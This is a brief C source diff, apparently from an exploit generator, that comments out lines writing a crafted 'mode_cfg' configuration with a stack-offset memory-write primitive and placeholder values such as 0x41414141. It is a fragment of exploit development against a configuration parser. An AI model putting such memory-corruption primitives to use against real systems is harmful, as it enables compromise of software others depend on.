@@ -289,8 +289,8 @@ int main(int   argc,
 						   0x42424242));
 #endif
 
-	fprintf(fp, "%s\n", write32_unslid(stack_base - 0x948, 0x41414141));
-	fprintf(fp, "mode_cfg{dns41.1.1.1;}");
+//	fprintf(fp, "%s\n", write32_unslid(stack_base - 0x948, 0x41414141));
+//	fprintf(fp, "mode_cfg{dns41.1.1.1;}");
 
 #if 0
 //	fprintf(fp,
